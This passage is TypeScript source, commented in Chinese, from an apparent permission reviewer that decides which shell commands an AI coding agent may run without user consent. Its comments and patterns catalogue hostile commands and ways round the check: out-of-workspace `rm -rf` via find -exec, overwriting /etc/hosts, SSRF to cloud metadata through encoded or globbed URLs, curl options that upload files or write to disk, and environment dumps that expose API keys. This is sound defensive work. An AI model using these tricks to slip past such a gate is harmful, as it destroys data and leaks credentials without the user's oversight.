  // executableName 归一大小写/.exe:Windows cmd/PowerShell 大小写不敏感,`CD /` 的 cwd 变更不能漏识别
  // (copilot 报:漏了会把后续相对破坏目标误当仍在工作区内)。
  const bin = executableName(tokens[0] ?? '');
  if (bin === 'source' || bin === '.' || bin === 'popd') return { changesDirectory: true };
  if (bin !== 'cd' && bin !== 'pushd') return { changesDirectory: false };
  if (bin === 'pushd' && tokens.slice(1).includes('-n')) return { changesDirectory: false };
  let optionsEnded = false;
  for (const token of tokens.slice(1)) {
    if (!optionsEnded && token === '--') {
      optionsEnded = true;
      continue;
    }
    if (!optionsEnded && token.startsWith('-') && token !== '-') continue;
    // pushd +/-N rotates the directory stack; the resulting cwd is runtime state.
    if (bin === 'pushd' && /^[+-]\d+$/.test(token)) {
      return { changesDirectory: true };
    }
    return { changesDirectory: true, target: token };
  }
  return { changesDirectory: true };
}

/**
 * 抽出 find `-exec`/`-execdir`/`-ok`/`-okdir` 各段的完整命令 argv(到 `;`/`\;`/`+` 止)。
 * `dirRelative` 标记 `-execdir`/`-okdir`:它们在**每个被匹配文件所在目录**里执行,相对目标的实际
 * cwd 随匹配项变动、静态不可证(codex 报 `find /ws/x -execdir rm -rf x` 实际删的是 /ws/x 整体)。
 */
function findExecCommands(tokens: string[]): { argv: string[]; dirRelative: boolean }[] {
  const out: { argv: string[]; dirRelative: boolean }[] = [];
  const execFlags = new Set(['-exec', '-execdir', '-ok', '-okdir']);
  for (let i = 0; i < tokens.length; i++) {
    const flag = tokens[i].toLowerCase();
    if (!execFlags.has(flag)) continue;
    const rest: string[] = [];
    for (let j = i + 1; j < tokens.length; j++) {
      const tok = tokens[j];
      if (tok === ';' || tok === '\\;' || tok === '+') break;
      rest.push(tok);
    }
    if (rest.length > 0) out.push({ argv: rest, dirRelative: flag === '-execdir' || flag === '-okdir' });
  }
  return out;
}

/** find 是否用内容驱动、静态不可证的遍历根(`-files0-from FILE`/`-`):根来自文件内容而非命令行(codex 报)。 */
function findHasDynamicRoots(tokens: string[]): boolean {
  return tokens.some((t) => /^--?files0?-from$/i.test(t) || /^--files-from$/i.test(t));
}

/** 一个 -exec 命令 argv(直接 `rm -rf …` 或 `sh -c '…'` 载荷)里破坏性 rm 的目标操作数。 */
function execCommandRmTargets(argv: string[], depth: number): string[] {
  const targets: string[] = [];
  // 先剥透明包装器/前置赋值:find -exec 的 COMMAND 可以是 `env FOO=1 rm …`、`command rm …`、
  // `timeout 5 rm …` 等,不解包会把 env/command 当可执行名而看不到 rm(codex 报)。
  const unwrapped = unwrapCommand(argv).tokens;
  const direct = destructiveRmTargets(unwrapped); // 直接(或解包后)`rm -rf /outside`
  if (direct) targets.push(...direct);
  const payload = shellCommandPayload(unwrapped); // `-exec sh -c 'rm -rf …'`
  if (payload) targets.push(...(commandDestructiveRmTargets(payload, depth) ?? []));
  return targets;
}

/**
 * 命令(含 shell -c 载荷,有限深递归)里破坏性 rm(`-rf`/`--recursive`)的目标操作数;`null` = 没有
 * 破坏性 rm。深到无法静态求证时返回 `['/']` 哨兵(始终触发同意)。用于 find -exec 载荷的目标级作用域判定。
 */
function commandDestructiveRmTargets(command: string, depth = 0): string[] | null {
  if (depth >= MAX_EXEC_REVIEW_DEPTH) return ['/']; // 不可静态求证 → 哨兵目标始终需同意
  let acc: string[] | null = null;
  for (const { text } of splitExecutableSegments(command)) {
    const tokens = unwrapWrappers(tokenize(text));
    const direct = destructiveRmTargets(tokens);
    if (direct) acc = [...(acc ?? []), ...direct];
    const payload = shellCommandPayload(tokens);
    if (payload) {
      const inner = commandDestructiveRmTargets(payload, depth + 1);
      if (inner) acc = [...(acc ?? []), ...inner];
    }
  }
  return acc;
}

/**
 * find -exec 载荷里引用被匹配路径的占位目标(`{}`、`$0`..`$9`、`$@`、`$*`):其删除作用域由遍历根决定。
 * 注:分段器 stripShellControlTokens 会把段尾/段首 `{}` 的花括号当 shell 分组符剥掉,令占位符残成 `{`
 * 或 `}`;find -exec 语境里它们只可能是被匹配路径占位,一并按占位处理(避免误当花括号动态目标升红线)。
 */
function isMatchedPathPlaceholder(target: string): boolean {
  return target === '{}' || target === '{' || target === '}' || /^\$(?:\d+|[@*])$/.test(target);
}

/** 被匹配路径占位符具化后挂在遍历根下的静态叶名。 */
const MATCHED_PATH_SENTINEL = '.cindy-matched-path';

/**
 * 内容驱动(`-files0-from`)的遍历根静态不可证:匹配项可能落在任何目录,含系统路径。具化占位符时
 * 用这个受保护根 —— 写它/删它一律必问,而只读用法(`-exec grep foo {} +`)不含写通道,不受影响。
 */
const UNPROVABLE_MATCH_ROOT = '/etc/.cindy-unprovable-match';

/** argv 里是否出现被匹配路径占位符(独立 token 或藏在 `sh -c` 载荷字符串里的 `{}`/`$1`)。 */
function hasMatchedPathPlaceholder(argv: string[]): boolean {
  return argv.some((t) => isMatchedPathPlaceholder(t) || /\{\}|\$(?:\d+|[@*])/.test(t));
}

/** 把 token(含载荷字符串内部)里的被匹配路径占位符换成具化后的静态路径。 */
function substituteMatchedPath(token: string, sentinel: string): string {
  if (isMatchedPathPlaceholder(token)) return sentinel;
  return token.replace(/\{\}/g, sentinel).replace(/\$(?:\d+|[@*])/g, sentinel);
}

/**
 * 把遍历根具化成一个静态的「被匹配路径」:根在区内 → 哨兵在区内;根是 `/etc` → 哨兵落 `/etc`,
 * 从而让占位目标保持「作用域由遍历根决定」的语义。根本身不可静态解析(变量/glob/`~`,或相对根
 * 且有效 cwd 未知)时返回 `null` → 调用方 fail-closed。
 */
/**
 * 把 argv 还原成命令字符串给递归审查用。**逐 token 单引号**包裹:载荷本身通常已含双引号
 * (`sh -c 'rm -rf "$1"'`),用 JSON 双引号序列化会把它们转义成 `\"`,再 tokenize 时反斜杠被保留、
 * 目标残成 `\"/path\"` 而失真;单引号内 tokenize 不做反斜杠处理,能原样取回 token。
 */
function shellQuoteArgvForReview(tokens: string[]): string {
  return tokens.map((t) => `'${t.replace(/'/g, "'\\''")}'`).join(' ');
}

function matchedPathSentinel(
  root: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): string | null {
  if (/[$`{}*?[\]]/.test(root) || root.startsWith('~')) return null;
  const base = opts.cwd ?? workspaceRoots[0];
  if (!isAbsolutePath(toForwardSlashes(root)) && (!base || opts.cwdUnknown)) return null;
  const resolved = normalizeTarget(root, base ? [base] : []).replace(/\/+$/, '');
  return `${resolved}/${MATCHED_PATH_SENTINEL}`;
}

/**
 * 本段的写目标(shell 重定向 + 参数写通道)是否落在系统/受保护目录。相对目标按 `opts.cwd`
 * (调用方已把包装器/`cd` 解析出的**有效 cwd** 放进来)解析;cwd 未知时相对目标不可静态求证 →
 * 保守视为命中(fail-closed)。绝对目标不受 cwd 影响。
 */
function systemWriteTargetsInSegment(
  segment: string,
  tokens: string[],
  workspaceRoots: string[],
  opts: ShellReviewOptions,
): boolean {
  const targets = [...redirectionTargets(segment), ...argumentWriteTargets(tokens)];
  if (targets.length === 0) return false;
  // 静态不可证的写目标(tar -P 的归档成员等)一律要求同意。
  if (targets.includes(UNPROVABLE_WRITE_TARGET)) return true;
  const aliasFirmlinks = (opts.platform ?? process.platform) === 'darwin';
  const base = opts.cwd ?? workspaceRoots[0];
  return targets.some((t) =>
    // 每个目标查两种形态:原样(保留 Windows `\` 分隔符)与去 POSIX `\` 转义(`/e\tc`→`/etc`)。
    [t, t.replace(/\\(.)/g, '$1')].some((v) => {
      const forward = toForwardSlashes(v);
      // cwd 未知 + 相对目标 → 无法证明它没落进系统目录,fail-closed。
      if (opts.cwdUnknown && !isAbsolutePath(forward)) return true;
      return isProtectedSystemPath(canonicalPath(normalizeTarget(v, [base]), aliasFirmlinks));
    }));
}

/** 系统/区外批量破坏与受保护分支强推不能只交给模型裁决。 */
function scopedDestructionNeedsConsent(
  command: string,
  workspaceRoots: string[],
  opts: ShellReviewOptions,
  depth = 0,
): boolean {
  let currentCwd: string | undefined = opts.cwd ?? workspaceRoots[0];
  let currentCwdUnknown = opts.cwdUnknown === true;
  for (const { text: segment, separatorAfter } of splitExecutableSegments(command)) {
    const unwrapped = unwrapCommand(tokenize(segment), currentCwd, currentCwdUnknown);
    const tokens = unwrapped.tokens;
    // 超深包装器链剥不完 → 看不到真实命令(可能是区外破坏),fail-closed 必问(codex 报)。
    if (unwrapped.wrapperUnresolved) return true;
    const segmentOpts: ShellReviewOptions = {
      ...opts,
      cwd: unwrapped.cwd,
      cwdUnknown: unwrapped.cwdUnknown,
    };
    const bin = executableName(tokens[0] ?? '');
    // 系统写目标(shell 重定向 + 参数写通道)按**本段有效 cwd** 解析:相对目标必须挂到 unwrapped.cwd
    // (含 `cd /etc &&` 跨段传递与 `env -C /etc` 段内改目录),否则 `cp /tmp/payload hosts` 配 cwd=/etc
    // 实际覆盖 /etc/hosts 却因按 workspaceRoots 解析而只落灰区(codex 报)。
    if (systemWriteTargetsInSegment(segment, tokens, workspaceRoots, segmentOpts)) return true;
    const rmTargets = destructiveRmTargets(tokens);
    if (rmTargets?.some((target) =>
      destructiveTargetNeedsConsent(target, workspaceRoots, segmentOpts))) return true;
    // Windows cmd.exe 广泛递归删除(`rd`/`rmdir`/`del`/`erase` 带 `/s`)按目标作用域判定(codex 报)。
    const winRmTargets = windowsDestructiveRmTargets(tokens);
    if (winRmTargets?.some((target) =>
      destructiveTargetNeedsConsent(target, workspaceRoots, segmentOpts))) return true;
    // shell -c（含 -lc 等组合短选项）内还有一层命令字符串；递归有限深，超过说明静态结构已不可靠。
    const shellPayload = shellCommandPayload(tokens);
    if (shellPayload && (depth >= MAX_EXEC_REVIEW_DEPTH || scopedDestructionNeedsConsent(
      shellPayload, workspaceRoots, segmentOpts, depth + 1))) {
      return true;
    }
    // cmd.exe /c "rd /s /q …" 把破坏性删除藏进 cmd 载荷,递归下探(codex 报)。
    const cmdPayload = cmdCommandPayload(tokens);
    if (cmdPayload && (depth >= MAX_EXEC_REVIEW_DEPTH || scopedDestructionNeedsConsent(
      cmdPayload, workspaceRoots, segmentOpts, depth + 1))) {
      return true;
    }
    if (bin === 'find') {
      const findRoots = findDeleteRoots(tokens);
      const deletes = tokens.some((token) => token === '-delete');
      // -files0-from 等内容驱动的遍历根静态不可证(可能含区外/系统目录),findDeleteRoots 会回退成 ['.'] 误判
      // 区内 → 只要有破坏动作(-delete 或 -exec 删)就必问(codex 报)。
      const dynamicRoots = findHasDynamicRoots(tokens);
      // 每个 -exec/-execdir 命令(直接 `rm -rf …` 或 `sh -c 'rm -rf …'`)取其破坏性 rm 目标;两种形态统一处理,
      // 不再把直接 -exec rm 归约成布尔而丢掉操作数(codex 报 `find build -exec rm -rf /outside \;`)。
      let execMatchedRm = false;
      for (const { argv, dirRelative } of findExecCommands(tokens)) {
        const rmTargetsInExec = execCommandRmTargets(argv, depth + 1);
        // -execdir 在每个匹配项所在目录执行,相对目标 cwd 随匹配项变动、不可静态证明在区内
        // (codex 报 `find /ws/x -execdir rm -rf x` 实删 /ws/x 整体)→ 用 cwdUnknown 强制相对目标必问。
        const execScope = dirRelative ? { ...segmentOpts, cwdUnknown: true } : segmentOpts;
        // 忽略 {} 直接删的字面/独立目标(`rm -rf /` / `/outside` / -execdir 下的相对目标)按其作用域判定。
        if (rmTargetsInExec.some((target) => !isMatchedPathPlaceholder(target)
          && destructiveTargetNeedsConsent(target, workspaceRoots, execScope))) return true;
        if (rmTargetsInExec.some(isMatchedPathPlaceholder)) execMatchedRm = true;
        // rm 之外的危险面同样要审:受保护写通道(`-exec cp payload /etc/hosts \;`、`-exec tee /etc/x \;`、
        // `-exec install -d /etc/cron.d \;`)、载荷里的重定向与 `cd /etc &&` 跨段(codex 报只查了 rm 目标)。
        // 做法是把内层 argv 当独立命令整段复用完整审查,占位符先按遍历根具化 —— 否则 `{}`/`$1` 会被当成
        // 不可静态求值的动态目标而误拦,且能顺带覆盖「写被匹配到的路径」(`find /etc -exec truncate -s0 {} \;`)。
        const concreteRoots = hasMatchedPathPlaceholder(argv)
          ? (dynamicRoots ? [UNPROVABLE_MATCH_ROOT] : findRoots)
          : [null];
        for (const root of concreteRoots) {
          let innerArgv = argv;
          if (root !== null) {
            const sentinel = matchedPathSentinel(root, workspaceRoots, segmentOpts);
            if (sentinel === null) return true; // 根不可静态解析 → 占位目标落哪不可证
            innerArgv = argv.map((t) => substituteMatchedPath(t, sentinel));
          }
          if (depth >= MAX_EXEC_REVIEW_DEPTH || scopedDestructionNeedsConsent(
            shellQuoteArgvForReview(innerArgv), workspaceRoots, execScope, depth + 1)) return true;
        }
      }
      // 删的是被匹配到的路径(占位符 {}/$0/…),或 -delete → 删除作用域由遍历根决定;动态根一律必问。
      if (deletes || execMatchedRm) {
        if (dynamicRoots) return true;
        if (findRoots.some((target) =>
          destructiveTargetNeedsConsent(target, workspaceRoots, segmentOpts))) return true;
      }
    }
    // xargs / parallel 动态补入的目标无法从 argv 证明在工作区内；递归/强制 rm 必须保留用户同意
    // (codex 报:parallel 与 xargs 同为执行器,`parallel rm -rf -- /outside` 也会跑 rm)。
    const nestedRm = tokens.findIndex((token) => executableName(token) === 'rm');
    if ((bin === 'xargs' || bin === 'parallel') && nestedRm >= 0
      && destructiveRmTargets(tokens.slice(nestedRm)) !== null) return true;
    if (bin === 'xargs') {
      const nested = xargsCommandTokens(tokens);
      if (nested === null) {
        // Unmodelled options plus an apparent shell command cannot be proven safe.
        if (tokens.slice(1).some((token) => SHELL_EXECUTORS.has(executableName(token)))) return true;
      } else if (nested.length > 0 && (depth >= MAX_EXEC_REVIEW_DEPTH || scopedDestructionNeedsConsent(
        serializeArgvForReview(nested), workspaceRoots, segmentOpts, depth + 1))) {
        return true;
      }
    }
    // parallel 的选项文法与 xargs 不同,不做完整 argv 建模;但它跑 shell 执行器时同样无法静态证明安全 →
    // 保留同意(如 `parallel sh -c '…'` / `parallel bash …`)。
    if (bin === 'parallel'
      && tokens.slice(1).some((token) => SHELL_EXECUTORS.has(executableName(token)))) return true;
    if (forcePushNeedsConsent(tokens)) return true;

    const cwdChange = directoryChangeTarget(tokens);
    if (!cwdChange.changesDirectory || separatorAfter === 'pipe' || separatorAfter === 'background') {
      continue;
    }
    if (separatorAfter === 'or') {
      // The next branch may run after the directory change failed, while later
      // sequence segments may also run after it succeeded. Keep both fail-closed.
      currentCwd = undefined;
      currentCwdUnknown = true;
      continue;
    }
    const nextCwd = resolveCwdTarget(
      cwdChange.target,
      unwrapped.cwd,
      unwrapped.cwdUnknown,
    );
    currentCwd = nextCwd.cwd;
    currentCwdUnknown = nextCwd.cwdUnknown;
  }
  return false;
}

function isSafeReadonlyBin(bin: string, segment: string, tokens: string[]): boolean {
  if (!SAFE_READONLY_BINS.has(bin)) return false;
  // 以下 flag 检测都跑在**去引号标记**的 segment 上(见 classifyShellSegment),防 -ex'ec' / -'o' 拼接绕过。
  // find 的执行/删除/写文件 flag:-exec/-delete/-fprintf/-fls(-print/-ls 写 stdout,仍算只读)。
  if (bin === 'find' && /-(?:exec(?:dir)?|ok(?:dir)?|delete)\b|-f(?:print[f0]?|ls)\b/.test(segment)) return false;
  // sort:-o/--output 写文件;--compress-program 会运行任意外部程序(RCE)。GNU sort 接受唯一前缀缩写
  // (`--compress-prog` / `--compress-p`,codex 报),故按前缀匹配 —— `--o…`(仅 --output)与 `--compress…`
  // (仅 --compress-program)开头的长选项一律拦(短选项 -o 单列)。
  if (bin === 'sort' && /(?:^|\s)(?:-o\b|-o\S|--o[a-z-]*\b|--compress[a-z-]*\b)/.test(segment)) return false;
  // base64(BSD/macOS `-o <file>` 把解码内容写任意文件)、tree(`-o <file>` 把树输出写文件)—— -o/--output 落盘。
  if ((bin === 'base64' || bin === 'tree') && /(?:^|\s)(?:-o\b|-o\S|--output\b)/.test(segment)) return false;
  // ripgrep 跑外部程序的 flag:--pre=CMD(预处理器)、--hostname-bin=CMD(取 hostname 供超链接)= RCE。
  // --pre-glob 无害不拦。
  if (bin === 'rg' && (/--pre(?:=|\s|$)/.test(segment) || /--hostname-bin\b/.test(segment))) return false;
  // jq/yq:-i/--in-place 就地改文件;env/$ENV/strenv 读取注入的凭证环境变量(与 shell $VAR 同等泄漏面)。
  if (bin === 'yq' || bin === 'jq') {
    if (/(?:^|\s)-i\b|(?:^|\s)--in-?place\b/.test(segment)) return false;
    if (/(?<!\.)\b(?:env|strenv)\b|\$ENV\b/.test(segment)) return false;
  }
  // uniq 的第二个位置参数是输出文件(写)。计数用 tokens(全引号参数已剥),对拼接引号同样稳健。
  if (bin === 'uniq' && tokens.slice(1).filter((t) => !t.startsWith('-')).length >= 2) return false;
  // ps 显示环境变量(BSD 裸选项簇含 `e`:`ps eww` / `ps auxe` / `ps e`;或 `-E` / `--environment`)
  // 会 dump 整个进程环境 —— 含注入子进程的 provider API key(见 env-builder),是凭证外泄面,不放行。
  // `-e`(dash + 小写 e = 选所有进程)是常用且安全形态,大小写敏感区分,不误伤。
  if (bin === 'ps') {
    const dumpsEnv = tokens.slice(1).some((t) => {
      if (t.startsWith('--')) return /^--environ/.test(t);        // --environment
      if (t.startsWith('-')) return t.includes('E');              // -E(大写)= 环境;-e(小写)= 选进程,安全
      return /^[A-Za-z]+$/.test(t) && t.includes('e');            // BSD 裸选项簇含 e
    });
    if (dumpsEnv) return false;
  }
  return true;
}

/**
 * curl/wget 的只读 GET → 放行(命令行浏览器场景;stdout 默认)。放行条件全部满足:
 *   - 无上传 / 非 GET 方法(bin 各自的 upload flag),无落盘到文件(-o/-O/--output);
 *   - **能认出一个 URL/host 目标**——认不出(无位置参数 / 参数不像 URL)一律 fail-closed 升级,
 *     不因"没识别出危险"而放行(修 copilot 报的 no-scheme/no-URL 漏放);
 *   - **目标 URL 无查询串**:`?…=…` 可能把数据编码进 URL 外发(GET 型 exfil,不需 -d/-F),含无 scheme 的
 *     `host/path?q=` 形态。命令替换 `$(...)` 另有 COMMAND_SUBSTITUTION 拦截。
 */
/** curl/wget 的 URL/host 目标 token(有 scheme、无 scheme host、localhost、IPv4)。 */
function isFetchTargetToken(t: string): boolean {
  return (
    /^https?:\/\//i.test(t) ||                            // 仅 http(s):// 算安全 fetch 目标(file://scp://ftp:// 等另拦)
    /^[\w.-]+\.[a-z]{2,}(?:[:/].*)?$/i.test(t) ||         // 无 scheme 的 host[/path][:port]
    /^localhost(?::\d+)?(?:[/?].*)?$/i.test(t) ||         // localhost[:port]
    /^\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?(?:[/?].*)?$/.test(t) // IPv4[:port]
  );
}

/**
 * 内网 / 环回 / 链路本地(含云 metadata 169.254.169.254)/ *.internal —— 抓取即敏感,一律升级:
 * SSRF 打云 metadata 会把实例凭证读进模型上下文,localhost/内网服务数据同理。公网 host 才当"命令行浏览器"放行。
 *
 * **已知限制(静态不可闭合):只按 URL 里的字面 host/IP 判定,不做 DNS 解析。** 攻击者控制的域名或
 * DNS 重绑定(public.example → 169.254.169.254)静态无法识别 —— 解析要真发 DNS(非确定、侧信道、
 * 且这正是 fetch 本身要做的事)。这类残口(与符号链接、-L 重定向同源)应由网络出口过滤(禁 link-local /
 * RFC1918 出站)在网络层堵,不在命令字符串审查层。前提也需模型去抓一个攻击者控制的域名。
 */
/**
 * 按 curl/inet_aton 规则解析一个数字型 host 分量:`0x`/`0X` 前缀=十六进制,前导 `0`=八进制,否则十进制。
 * 畸形(如含 8/9 的"八进制" `08`)返回 null,由调用方 fail-closed 处理。
 */
function parseNumericHostComponent(p: string): number | null {
  if (/^0[xX][0-9a-fA-F]+$/.test(p)) return parseInt(p.slice(2), 16);
  if (/^0[0-7]+$/.test(p)) return parseInt(p, 8);
  if (p === '0') return 0;
  if (/^[1-9]\d*$/.test(p)) return Number(p);
  return null;
}

/** host 归一用:NUL 及其后全部(curl 在 NUL 处截断);以及嵌入的控制字符/空白(curl 会剥掉)。 */
const NUL_AND_REST = new RegExp(`${String.fromCharCode(0)}[\\s\\S]*$`);
const HOST_CONTROL_CHARS = new RegExp('[\\s\\u0000-\\u001f\\u007f]', 'g');

/**
 * 内网判定必须在 **百分号解码后**的 host 上做:curl/浏览器把 `%31%36%39.%32%35%34.…` 归一成
 * `169.254.169.254` 再发请求(codex 的 `curl -sv` 探针确认请求行与 Host 都已归一),而未解码的字符串
 * 既不像 IPv4 也不像 localhost —— 会被 isSafeFetch **确定性 auto-approve**(静默放行,比降灰区更糟)。
 * 逐轮解码(≤3 轮,覆盖 `%2531` 这类双重编码),任一形态命中内网即算内网;解码失败(`%zz` 等畸形
 * 序列)静态不可证清白 → fail-closed。
 */
function isInternalFetchTarget(t: string): boolean {
  const forms: string[] = [t];
  let cur = t;
  for (let round = 0; round < 3 && /%[0-9a-fA-F]{2}/.test(cur); round++) {
    let decoded: string;
    try {
      decoded = decodeURIComponent(cur);
    } catch {
      return true;
    }
    if (decoded === cur) break;
    cur = decoded;
    forms.push(cur);
  }
  return forms.some(isInternalFetchHostForm);
}

/** 从 fetch 目标里取归一后的 host(去 scheme/path/userinfo/port、NUL 截断、控制字符、尾随点)。 */
function fetchHostOf(t: string): string {
  return t
    .replace(/^[a-z][\w+.-]*:\/\//i, '') // 去 scheme
    .replace(/[/?#].*$/, '')             // 去 path/query/fragment
    .replace(/^[^@]*@/, '')              // 去 userinfo
    .replace(/:\d+$/, '')                // 去端口
    // NUL 截断与控制字符/空白:解码后可能出现 `169.254.169.254\0.example.com` 或嵌入的
    // TAB/CR/LF —— curl 在此截断或剥掉,不归一会让内网 host 伪装成外网域名(与编码同类绕过)。
    .replace(NUL_AND_REST, '')
    .replace(HOST_CONTROL_CHARS, '')
    .replace(/\.+$/, '')                 // 去尾随点(FQDN 根点)
    .toLowerCase();
}

/**
 * 取 host 的 IPv4 前两字节(内网/metadata 判定只需前两段)。支持点分、缩写形(127.1)、整数
 * (2852039166)与十六进制(0xA9FEA9FE);每个分量按 curl/inet_aton 进制规则解析(前导 0=八进制)。
 * `unprovable: true` 表示是数字型 host 但非规范(如畸形八进制 08)—— 调用方应 fail-closed。
 */
function fetchHostIpv4Prefix(host: string): { a: number; b: number; unprovable?: boolean } | null {
  const NUMERIC = /^(?:0[xX][0-9a-fA-F]+|\d+)$/;
  const parts = host.split('.');
  if (parts.length >= 2 && parts.length <= 4 && parts.every((q) => NUMERIC.test(q))) {
    const p0 = parseNumericHostComponent(parts[0]);
    const p1 = parseNumericHostComponent(parts[1]);
    if (p0 === null || p1 === null) return { a: -1, b: -1, unprovable: true };
    // 两段式 a.B24:B24 高 8 位是第二字节(inet_aton 规则)。
    return { a: p0, b: parts.length === 2 ? (p1 >>> 16) & 255 : p1 };
  }
  if (NUMERIC.test(host)) {
    const n = parseNumericHostComponent(host);
    if (n === null) return { a: -1, b: -1, unprovable: true };
    if (n >= 0 && n <= 0xffffffff) return { a: (n >>> 24) & 255, b: (n >>> 16) & 255 };
  }
  return null;
}

/**
 * 云 metadata 端点(而非泛内网):抓它等于读取实例的临时云凭证 —— 静态可证的高危,两条通道
 * (内置 WebFetch 与 shell curl/wget)都必须确定性同意。
 *
 * **刻意只含 metadata、不含 localhost/私网**:`curl localhost:3000` 是开发日常,把它一并硬弹窗会
 * 违反 Auto-review「尽量不打扰」的第一承诺;localhost/私网仍走灰区交模型裁决。
 * 复用 isInternalFetchTarget 的百分号解码外壳,编码形态同样命中。
 */
function isCloudMetadataFetchTarget(t: string): boolean {
  const forms: string[] = [t];
  let cur = t;
  for (let round = 0; round < 3 && /%[0-9a-fA-F]{2}/.test(cur); round++) {
    let decoded: string;
    try {
      decoded = decodeURIComponent(cur);
    } catch {
      return false; // 畸形序列由 isInternalFetchTarget 兜成内网(灰区),这里不另判红线
    }
    if (decoded === cur) break;
    cur = decoded;
    forms.push(cur);
  }
  return forms.some((form) => {
    const host = fetchHostOf(form);
    if (host === 'metadata.google.internal' || host.endsWith('.internal')) return true;
    const ip = fetchHostIpv4Prefix(host);
    return ip !== null && ip.a === 169 && ip.b === 254; // 链路本地:含 169.254.169.254
  });
}

function isInternalFetchHostForm(t: string): boolean {
  const host = fetchHostOf(t);
  if (host === 'localhost' || host.endsWith('.localhost') || host === '0.0.0.0' || host === '::1') return true;
  if (host === 'metadata.google.internal' || host.endsWith('.internal')) return true;
  if (host.startsWith('[')) return true; // IPv6 字面量(环回/私网难精确,保守升级)
  const ip = fetchHostIpv4Prefix(host);
  if (ip === null) return false;
  if (ip.unprovable) return true;        // 非规范数字 host → 保守视为内网升级
  const { a, b } = ip;
  if (a === 127 || a === 10 || a === 0) return true;    // 环回 / 10.0.0.0-8 / 0.0.0.0-8
  if (a === 169 && b === 254) return true;              // 链路本地 + 云 metadata 169.254.169.254
  if (a === 172 && b >= 16 && b <= 31) return true;     // 172.16.0.0-12
  if (a === 192 && b === 168) return true;              // 192.168.0.0-16
  return false;
}

function isSafeFetch(bin: string, segment: string, tokens: string[]): boolean {
  // 只有 curl 可能是"只读浏览器"(默认写 stdout、默认不跟随重定向)。wget 默认把内容写进本地文件
  // 且默认跟随重定向(最终 host 不可判)→ 一律升级,不当安全 fetch。
  if (bin !== 'curl') return false;
  if (FETCH_OUTPUT_FLAGS.test(segment)) return false;     // -o/-O 落盘
  if (CURL_UPLOAD_FLAGS.test(segment) || CURL_NONGET_METHOD.test(segment)) return false; // -d/-F/--json 上传、非 GET 方法
  if (CURL_REDIRECT_FLAGS.test(segment)) return false;    // -L 跟随重定向 → 目标不可判 → 升级
  if (CURL_SENSITIVE_FLAGS.test(segment)) return false;   // 凭证/隐藏参数/SSRF 改路由 flag → 升级
  // curl `@filename` 从文件读内容:-d/-F/-T 已由 UPLOAD_FLAGS 拦,-H/--header @file 会把文件每行当 header 外发
  // (codex 报 `curl -H @/repo/config.txt`)→ 升级。含贴合/等号/空格形态。
  if (/(?:^|\s)(?:-H|--header)[=\s]*@/.test(segment)) return false;
  // curl -w/--write-out 的 `%output{file}` / `%output{>>file}` 指令把 write-out 写进任意文件(创建/覆盖/追加)
  // (codex 报 `curl -w '%output{/tmp/pwn}…'`)→ 升级。-w 本身(如 `%{http_code}`)无害不拦,只拦 %output{。
  if (/%output\{/i.test(segment)) return false;
  // curl 危险长选项的**唯一前缀缩写**(`--trace`/`--trace-ascii` 写调试文件、`--dump-h`=--dump-header、
  // `--loc`=--location、`--outp`=--output 等):全称正则会漏(codex 报 --trace)。逐 `--` token 取选项名,
  // 命中任一危险长选项(落盘/写文件/上传/非GET/重定向/凭证/SSRF)的前缀即升级。极短歧义缩写一并升级。
  const DANGEROUS_CURL_LONG_OPTS = [
    '--output', '--output-dir', '--remote-name', '--remote-name-all', '--remote-header-name',
    '--dump-header', '--trace', '--trace-ascii', '--trace-config', '--etag-save', '--cookie-jar',
    '--stderr', '--create-dirs', '--libcurl',
    '--data', '--data-raw', '--data-binary', '--data-urlencode', '--data-ascii', '--form', '--form-string',
    '--upload-file', '--json', '--url-query', '--request',
    '--location', '--location-trusted',
    '--user', '--netrc', '--netrc-file', '--netrc-optional', '--config', '--cookie', '--resolve', '--connect-to',
    '--unix-socket', '--abstract-unix-socket', '--proxy', '--proxy-user', '--preproxy', '--interface',
    '--variable', '--expand-url', '--oauth2-bearer', '--header', '--proxy-header', '--cert', '--key',
  ];
  for (const tok of tokens) {
    if (!tok.startsWith('--')) continue;
    const name = stripExpansions(tok.split('=')[0].replace(/['"\\]/g, ''));
    if (name.length >= 3 && DANGEROUS_CURL_LONG_OPTS.some((full) => full.startsWith(name))) return false;
  }
  const positional = tokens.slice(1).filter((t) => !t.startsWith('-'));
  // 非 http(s) scheme(file:// 读本地文件、scp://sftp:// 外发、ftp/dict/gopher 等)超出"命令行浏览器"面 → 升级。
  if (positional.some((t) => /^[a-z][\w+.-]*:\/\//i.test(t) && !/^https?:\/\//i.test(t))) return false;
  // URL 内嵌凭证(`https://user:pass@host`):curl 会把 userinfo 作为 Basic auth 外发 → 凭证泄漏面 → 升级
  // (codex 报;host 判定处会剥掉 userinfo,故必须在此先拦)。匹配 authority 段(首个 `/` 前)出现的 `@`。
  if (positional.some((t) => /^https?:\/\/[^/?#]*@/i.test(t))) return false;
  if (positional.some((t) => t.includes('?'))) return false; // 查询串外发面(含无 scheme 的 host?query)
  // curl URL glob(默认开启):`{a,b}` 列表 / `[1-9]`·`[a-z]` 范围会展开成多个 URL,字面 token 静态
  // 无法预判展开后的 host → `curl 'http://{example.com,169.254.169.254}/…'` 会连 metadata 一起抓
  // (codex 报)。除非显式 `-g`/`--globoff` 关闭 glob,含 `{}`/`[]` 的 URL 目标一律升级。
  const globOff = /(?:^|\s)-[a-zA-Z]*g\b|(?:^|\s)--globoff\b/.test(segment);
  if (!globOff && positional.some((t) => isFetchTargetToken(t) && /[{}[\]]/.test(t))) return false;
  // curl 可接多个 URL 并逐个抓取 → 必须校验**每一个** URL 目标,不能只看第一个
  // (`curl https://public http://169.254.169.254/...` 会把 metadata 也抓回来)。
  const targets = positional.filter(isFetchTargetToken);
  if (targets.length === 0) return false;               // 认不出 URL 目标 → fail-closed 升级
  if (targets.some(isInternalFetchTarget)) return false; // 任一目标是云 metadata / localhost / 内网 → 升级
  return true;
}

const SAFE_GIT_GLOBAL_FLAGS: ReadonlySet<string> = new Set([
  '--no-pager', '--no-replace-objects', '--bare',
  '--literal-pathspecs', '--glob-pathspecs', '--noglob-pathspecs',
  '--icase-pathspecs', '--no-optional-locks',
]);

function isTrustedGitCwdPath(
  target: string | undefined,
  workspaceRoots: string[],
  cwd: string | undefined,
  cwdUnknown: boolean,
  platform: NodeJS.Platform | undefined,
): boolean {
  // Git 会从 -C 指向的仓库读取配置；配置可激活外部 helper。纯词法检查无法确认工作区
  // 子目录不是指向区外的 symlink，因此只允许它精确等于宿主已确认的 cwd（无 cwd 时为主工作区根）。
